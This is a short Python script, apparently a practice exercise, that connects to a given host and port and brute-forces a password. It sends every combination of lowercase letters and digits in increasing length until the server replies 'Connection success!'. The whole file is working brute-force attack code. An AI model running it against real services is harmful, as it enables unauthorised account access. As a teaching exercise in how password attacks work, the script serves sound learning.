import sys
import socket
import itertools

args = sys.argv

def password_generator():
    i = 1
    while True:
        for item in itertools.product(letters, repeat=i):
            yield ("".join(item))
        i += 1

with socket.socket() as client_socket:
    ip_address, port = args[1:]
    client_socket.connect((ip_address, int(port)))
    letters = ""
    for i in range(ord("a"), ord("z") + 1):
        letters += chr(i)
    for i in range(ord("0"), ord("9") + 1):
        letters += chr(i)

    generator = password_generator()
    while True:
        msg = next(generator)
        client_socket.send(msg.encode())
        response = client_socket.recv(1024)
        if response.decode() == "Connection success!":
            print(msg)
            break
        if response.decode() == "Too many attempts":
            break
